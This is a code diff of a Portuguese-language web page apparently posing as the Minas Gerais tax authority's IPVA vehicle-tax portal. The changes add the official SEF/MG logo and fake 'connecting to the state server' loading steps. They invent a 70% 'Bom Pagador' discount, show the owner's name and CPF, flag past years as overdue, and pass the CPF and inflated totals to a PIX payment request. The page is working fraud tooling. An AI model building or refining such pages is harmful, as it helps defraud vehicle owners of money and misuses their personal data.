@@ -123,11 +123,20 @@
 
 <body class="result-page loading">
 
-    <!-- Fullscreen Loading Overlay -->
-    <div id="pageLoadingOverlay">
-        <div class="loading-spinner"></div>
-        <div class="loading-text">Carregando dados do veículo...</div>
-        <div class="loading-subtext">Aguarde alguns instantes</div>
+    <!-- Enhanced Loading Overlay -->
+    <div id="pageLoadingOverlay" class="hidden">
+        <div class="loading-content">
+            <img src="https://buscar-renavam-ipva-digital.fazenda.mg.gov.br/_next/image/?url=%2F_next%2Fstatic%2Fmedia%2FsefLogo02.1d6fc26d.png&w=384&q=75"
+                alt="SEF/MG" class="loading-logo" style="max-width: 200px; margin-bottom: 20px;">
+            <div class="loading-spinner"></div>
+            <div class="loading-text" id="loadingText">Conectando ao sistema...</div>
+            <div class="loading-steps">
+                <div class="step" id="step1">Conectando ao servidor do Estado de Minas Gerais...</div>
+                <div class="step" id="step2">Buscando informações do veículo...</div>
+                <div class="step" id="step3">Buscando débitos em aberto...</div>
+                <div class="step" id="step4">Verificando qualificação Programa Bom Pagador...</div>
+            </div>
+        </div>
     </div>
 
     <!-- Top Bar Red -->
@@ -147,6 +156,32 @@
         <section class="section-official">
             <h3 class="section-title">Dados do veículo</h3>
             <div class="vehicle-grid">
+                <!-- Proprietário (Person) -->
+                <div class="v-item" style="grid-column: 1 / -1;">
+                    <span class="v-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                            <circle cx="12" cy="7" r="4"></circle>
+                        </svg>
+                    </span>
+                    <div><span class="v-label">Proprietário:</span> <span class="v-value" id="resNome">...</span></div>
+                </div>
+
+                <!-- Documento (Card) -->
+                <div class="v-item" style="grid-column: 1 / -1;">
+                    <span class="v-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                            <line x1="16" y1="2" x2="16" y2="6"></line>
+                            <line x1="8" y1="2" x2="8" y2="6"></line>
+                            <line x1="3" y1="10" x2="21" y2="10"></line>
+                        </svg>
+                    </span>
+                    <div><span class="v-label">Documento:</span> <span class="v-value" id="resDoc">***</span></div>
+                </div>
+
                 <!-- UF (Map Pin) -->
                 <div class="v-item">
                     <span class="v-icon">
@@ -218,20 +253,6 @@
                         </svg>
                     </span>
                     <div><span class="v-label">Chassi:</span> <span class="v-value" id="resChassi">**********...</span>
-                    </div>
-                </div>
-                <!-- Motor (Settings) -->
-                <div class="v-item">
-                    <span class="v-icon">
-                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"
-                            stroke-linecap="round" stroke-linejoin="round">
-                            <circle cx="12" cy="12" r="3"></circle>
-                            <path
-                                d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z">
-                            </path>
-                        </svg>
-                    </span>
-                    <div><span class="v-label">Motor:</span> <span class="v-value" id="resMotor">**********...</span>
                     </div>
                 </div>
             </div>
@@ -311,10 +332,19 @@
 
                     <!-- Benefit Message -->
                     <div
-                        style="background: #e8f5e9; border-left: 3px solid #28a745; padding: 12px 16px; margin-bottom: 20px; border-radius: 4px;">
-                        <div style="font-size: 13px; color: #2e7d32; line-height: 1.5;">
-                            <strong>Vantagem:</strong> Com o desconto Bom Pagador, você paga apenas a 1ª parcela hoje e
-                            mantém seu dinheiro no bolso. Sem necessidade de pagamento à vista.
+                        style="background: #e8f5e9; border-left: 4px solid #28a745; padding: 15px 20px; margin-bottom: 25px; border-radius: 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+                        <div style="font-size: 13px; color: #1b5e20; line-height: 1.6;">
+                            <strong style="display:block; margin-bottom:6px; font-size:14px;">🌟 Programa de Incentivo
+                                ao Contribuinte</strong>
+                            Você foi selecionado para este benefício exclusivo. O desconto de <strong>70%</strong>
+                            aplica-se sobre o valor total do IPVA e permite o parcelamento do saldo restante em até 4
+                            vezes iguais.
+                            <br><br>
+                            <span
+                                style="display:inline-block; background:#fff; padding:4px 8px; border-radius:4px; font-weight:600; border:1px solid #c8e6c9;">Importante:</span>
+                            Para validar este acordo e regularizar a situação do veículo, o pagamento do
+                            <strong>Licenciamento Anual (TRLAV)</strong> deve ser realizado integralmente junto com a
+                            primeira parcela.
                         </div>
                     </div>
 
@@ -555,8 +585,8 @@
                 </div>
 
                 <!-- Year 2025 - Collapsed -->
-                <div style="background: white; border: 2px solid #ddd; border-radius: 12px; padding: 18px; margin-bottom: 15px; cursor: pointer;"
-                    onclick="alert('Ano 2025 - Isento/Pago')">
+                <div id="card2025"
+                    style="background: white; border: 2px solid #ddd; border-radius: 12px; padding: 18px; margin-bottom: 15px; cursor: default;">
                     <div style="display: flex; align-items: center; justify-content: space-between;">
                         <div style="display: flex; align-items: center; gap: 12px;">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="#c62828">
@@ -566,19 +596,18 @@
                         </div>
                         <div style="display: flex; align-items: center; gap: 15px;">
                             <div style="text-align: right;">
-                                <div style="font-size: 13px; color: #666;">Valor total a pagar:</div>
-                                <div style="font-size: 16px; font-weight: 700; color: #999;">---</div>
+                                <div style="font-size: 13px; color: #666;" id="labelStatus2025">Valor total a pagar:
+                                </div>
+                                <div style="font-size: 16px; font-weight: 700; color: #999;" id="val2025">Em dia</div>
                             </div>
-                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
-                                <polyline points="6 9 12 15 18 9"></polyline>
-                            </svg>
+                            <!-- Removed Chevron since it's now a list -->
                         </div>
                     </div>
                 </div>
 
                 <!-- Year 2024 - Collapsed -->
-                <div style="background: white; border: 2px solid #ddd; border-radius: 12px; padding: 18px; margin-bottom: 15px; cursor: pointer;"
-                    onclick="alert('Ano 2024 - Isento/Pago')">
+                <div id="card2024"
+                    style="background: white; border: 2px solid #ddd; border-radius: 12px; padding: 18px; margin-bottom: 15px; cursor: default;">
                     <div style="display: flex; align-items: center; justify-content: space-between;">
                         <div style="display: flex; align-items: center; gap: 12px;">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="#c62828">
@@ -588,15 +617,15 @@
                         </div>
                         <div style="display: flex; align-items: center; gap: 15px;">
                             <div style="text-align: right;">
-                                <div style="font-size: 13px; color: #666;">Valor total a pagar:</div>
-                                <div style="font-size: 16px; font-weight: 700; color: #999;">---</div>
+                                <div style="font-size: 13px; color: #666;" id="labelStatus2024">Valor total a pagar:
+                                </div>
+                                <div style="font-size: 16px; font-weight: 700; color: #999;" id="val2024">Em dia</div>
                             </div>
-                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
-                                <polyline points="6 9 12 15 18 9"></polyline>
-                            </svg>
                         </div>
                     </div>
                 </div>
+
+
 
             </div>
 
@@ -630,7 +659,7 @@
                                 Valor Licen.</th>
                         </tr>
                     </thead>
-                    <tbody style="font-size: 15px; color: #333;">
+                    <tbody style="font-size: 15px; color: #333;" id="summaryBody">
                         <tr style="background-color: #fff;">
                             <td style="padding: 20px 15px; border-bottom: 1px solid #eee;">2026</td>
                             <td style="padding: 20px 15px; border-bottom: 1px solid #eee;" id="resIpvaVal">...</td>
@@ -891,8 +920,9 @@
                         body: JSON.stringify({
                             amount: amount,
                             plate: data.plate,
-                            session_id: data.session_id,  // Include session_id
-                            name: "SEF MG - IPVA 2026",
+                            session_id: data.session_id,
+                            name: data.owner_name || "Contribuinte",
+                            cpf: data.owner_doc,
                             city: data.city || "BELO HORIZONTE"
                         })
                     }).then(res => res.json()),
@@ -937,6 +967,17 @@
             }
         }
 
+        // Helper function to format currency
+        function formatCurrency(value) {
+            return value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        }
+
+        // Helper function to parse currency string to float
+        function parseCurrency(currencyString) {
+            if (typeof currencyString !== 'string') return parseFloat(currencyString) || 0;
+            return parseFloat(currencyString.replace('R$', '').replace(/\./g, '').replace(',', '.').trim()) || 0;
+        }
+
         window.onload = function () {
             const data = JSON.parse(sessionStorage.getItem('vehicleData'));
             if (!data) {
@@ -970,7 +1011,234 @@
             document.getElementById('resMuni').textContent = data.city || "---";
             document.getElementById('resRenavam').textContent = data.renavam;
             document.getElementById('resChassi').textContent = data.chassis;
-            document.getElementById('resMotor').textContent = data.engine;
+            // Motor removed
+
+            // Populate Owner Info
+            if (document.getElementById('resNome')) {
+                document.getElementById('resNome').textContent = data.owner_name || "Nome não informado";
+            }
+            if (document.getElementById('resDoc')) {
+                document.getElementById('resDoc').textContent = data.owner_doc || "CPF não informado";
+            }
+
+            // --- POPULATE HISTORY (2025, 2024) ---
+            function renderHistory(historyData) {
+                if (!historyData || !Array.isArray(historyData)) return;
+
+                historyData.forEach(yData => {
+                    const cardId = `card${yData.year}`;
+                    const valId = `val${yData.year}`;
+                    const statusId = `labelStatus${yData.year}`;
+
+                    const cardEl = document.getElementById(cardId);
+                    if (cardEl) {
+                        // Clear previous dynamic content if any
+                        const existingDetails = cardEl.querySelector('details');
+                        if (existingDetails) existingDetails.remove();
+                        // Also clear any old container
+                        const oldContainer = cardEl.querySelector('.history-items-container');
+                        if (oldContainer) oldContainer.remove();
+
+                        if (yData.status === "Pendente") {
+                            // Status & Value Labels
+                            const statusLabel = document.getElementById(statusId);
+                            if (statusLabel) {
+                                statusLabel.textContent = "Atrasado"; // Changed from Pendente
+                                statusLabel.style.color = "#dc3545";
+                            }
+                            const valLabel = document.getElementById(valId);
+                            if (valLabel) {
+                                valLabel.textContent = (typeof parseCurrency === 'function' ? parseCurrency(yData.total) : yData.total).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+                            }
+
+                            // Create Collapsible Details
+                            const detailsEl = document.createElement('details');
+                            detailsEl.style.marginTop = '15px';
+                            detailsEl.style.borderTop = '1px solid #eee';
+                            detailsEl.style.paddingTop = '10px';
+
+                            const summaryEl = document.createElement('summary');
+                            summaryEl.textContent = "Ver detalhes dos débitos";
+                            summaryEl.style.cursor = 'pointer';
+                            summaryEl.style.color = '#136B9E';
+                            summaryEl.style.fontWeight = '600';
+                            summaryEl.style.fontSize = '13px';
+                            summaryEl.style.marginBottom = '10px';
+                            detailsEl.appendChild(summaryEl);
+
+                            const itemsContainer = document.createElement('div');
+                            itemsContainer.className = 'history-items-container';
+
+                            // Render Checkboxes for each item
+                            if (yData.items && Array.isArray(yData.items)) {
+                                yData.items.forEach((item, idx) => {
+                                    const row = document.createElement('div');
+                                    row.style.display = 'flex';
+                                    row.style.justifyContent = 'space-between';
+                                    row.style.alignItems = 'center';
+                                    row.style.marginBottom = '8px';
+                                    row.style.fontSize = '12px';
+
+                                    const checkId = `check_${yData.year}_${idx}`;
+
+                                    row.innerHTML = `
+                                        <div style="display:flex; align-items:center; gap:8px;">
+                                            <input type="checkbox" id="${checkId}" class="history-checkbox" data-val="${item.value}">
+                                            <label for="${checkId}" style="cursor:pointer; color:#333;">${item.description} (${item.formatted_value})</label>
+                                        </div>
+                                    `;
+                                    itemsContainer.appendChild(row);
+                                });
+                            }
+
+                            detailsEl.appendChild(itemsContainer);
+                            cardEl.appendChild(detailsEl);
+
+                            // Visual highlight for attention
+                            cardEl.style.borderColor = "#ffcdd2";
+                            cardEl.style.backgroundColor = "#fff5f5";
+
+                        } else {
+                            // Em dia
+                            const statusLabel = document.getElementById(statusId);
+                            if (statusLabel) statusLabel.textContent = "Em dia";
+                        }
+                    }
+                });
+            }
+
+            // Call Render
+            renderHistory(data.history);
+
+            // --- CALCULATION LOGIC ---
+            function updateTotals() {
+                // Base Values
+                const rawFirstPayIPVA = parseFloat(data.raw_installment_val) || 0; // Just IPVA 1st Parcel (approx)
+                // Note: data.raw_first_payment_total INCLUDES licensing.
+                // Let's separate for display if possible, but calculating is safer:
+                // raw_first_payment_total = installment_val + licensing_val
+                const rawLicensing = parseFloat(data.raw_licensing_val) || 0;
+
+                // Adjust: rawFirstPayIPVA is correct (IPVA / 4).
+
+                // Future Installments = Just IPVA 2026 / 4
+                const rawInstallment = parseFloat(data.raw_installment_val) || 0;
+                // Full Payment (Cota Unica) = Full 2026 + Licensing
+                const rawFull2026 = parseFloat(data.raw_total_discounted) || 0;
+
+                // Sum Selected History & Build Summary List
+                let extras = 0;
+                let historySummary = [];
+
+                document.querySelectorAll('.history-checkbox:checked').forEach(cb => {
+                    const val = parseFloat(cb.getAttribute('data-val'));
+                    extras += val;
+                    // Find year context
+                    // IDs are check_YEAR_IDX
+                    const parts = cb.id.split('_');
+                    if (parts.length >= 2) {
+                        historySummary.push({
+                            year: parts[1],
+                            desc: "Valor Atrasado",
+                            val: val
+                        });
+                    }
+                });
+
+                // Total to Pay NOW (Entrance IPVA + Licensing + History)
+                const totalPayNow = rawFirstPayIPVA + rawLicensing + extras;
+
+                // --- UPDATE SESSION STORAGE FOR PIX ---
+                // This ensures generatePix() uses the updated value
+                data.raw_first_payment_total = totalPayNow;
+                sessionStorage.setItem('vehicleData', JSON.stringify(data));
+
+                // Update UI formatting
+                const fmt = (v) => v.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+                // 1. Header Totals
+                const elTotalTop = document.getElementById('resTotalTop');
+                if (elTotalTop) elTotalTop.textContent = fmt(totalPayNow);
+
+                const elTotalDetail = document.getElementById('resTotalDetail');
+                if (elTotalDetail) elTotalDetail.textContent = fmt(totalPayNow);
+
+                // 2. Installment 1 Card
+                const elP1 = document.getElementById('resParcela1');
+                if (elP1) elP1.textContent = fmt(totalPayNow);
+
+                // 3. Future Installments (2, 3, 4) - Fixed
+                ['resParcela2', 'resParcela3', 'valParcela4'].forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.textContent = fmt(rawInstallment);
+                });
+
+                // 4. Cota Unica (Full Pay)
+                const elCota = document.getElementById('resCotaUnica');
+                if (elCota) elCota.textContent = fmt(rawFull2026 + extras);
+
+                // 5. Sticky Bar Total
+                const elSticky = document.getElementById('totalStickyBar');
+                if (elSticky) elSticky.textContent = fmt(totalPayNow);
+
+                // 6. POPULATE SUMMARY TABLE
+                const tbody = document.getElementById('summaryBody');
+                if (tbody) {
+                    tbody.innerHTML = "";
+
+                    // Row 1: 2026 IPVA 1st Parcel
+                    let tr1 = document.createElement('tr');
+                    tr1.style.backgroundColor = "#fff";
+                    tr1.innerHTML = `
+                        <td style="padding: 15px; border-bottom: 1px solid #eee;">2026</td>
+                        <td style="padding: 15px; border-bottom: 1px solid #eee;">1ª Parcela IPVA (Acordo)</td>
+                        <td style="padding: 15px; text-align: right; border-bottom: 1px solid #eee;">${fmt(rawFirstPayIPVA)}</td>
+                    `;
+                    tbody.appendChild(tr1);
+
+                    // Row 2: Licensing
+                    let tr2 = document.createElement('tr');
+                    tr2.style.backgroundColor = "#fff";
+                    tr2.innerHTML = `
+                        <td style="padding: 15px; border-bottom: 1px solid #eee;">2026</td>
+                        <td style="padding: 15px; border-bottom: 1px solid #eee;">Licenciamento Anual</td>
+                        <td style="padding: 15px; text-align: right; border-bottom: 1px solid #eee;">${fmt(rawLicensing)}</td>
+                    `;
+                    tbody.appendChild(tr2);
+
+                    // Rows 3+: History Items
+                    historySummary.forEach(item => {
+                        let tr = document.createElement('tr');
+                        tr.style.backgroundColor = "#fff9fa"; // Slight red tint
+                        tr.innerHTML = `
+                            <td style="padding: 15px; border-bottom: 1px solid #eee;">${item.year}</td>
+                            <td style="padding: 15px; border-bottom: 1px solid #eee;">${item.desc} (Selecionado)</td>
+                            <td style="padding: 15px; text-align: right; border-bottom: 1px solid #eee;">${fmt(item.val)}</td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+
+                    // Row Total
+                    let trTotal = document.createElement('tr');
+                    trTotal.style.backgroundColor = "#f8f9fa";
+                    trTotal.style.fontWeight = "700";
+                    trTotal.innerHTML = `
+                        <td style="padding: 15px; border-top: 2px solid #ddd;" colspan="2">TOTAL A PAGAR AGORA</td>
+                        <td style="padding: 15px; text-align: right; border-top: 2px solid #ddd; color:#2c3e50;">${fmt(totalPayNow)}</td>
+                    `;
+                    tbody.appendChild(trTotal);
+                }
+            }
+
+            // Listeners
+            document.addEventListener('change', (e) => {
+                if (e.target.classList.contains('history-checkbox')) {
+                    updateTotals();
+                }
+            });
+
+            // Initial Run
+            updateTotals();
 
             // Dynamic Dates - installments are 1 month apart
             const today = new Date();
@@ -986,8 +1254,7 @@
             const totalPayNow = (valIpvaSingle + valLic).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
 
             // Populate Summary Table (bottom section)
-            document.getElementById('resIpvaVal').textContent = valIpvaSingle.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-            document.getElementById('resLicVal').textContent = valLic.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+            // Summary Table is now populated by updateTotals()
 
             // Populate total in fixed bottom bar
             document.getElementById('totalStickyBar').textContent = totalPayNow;
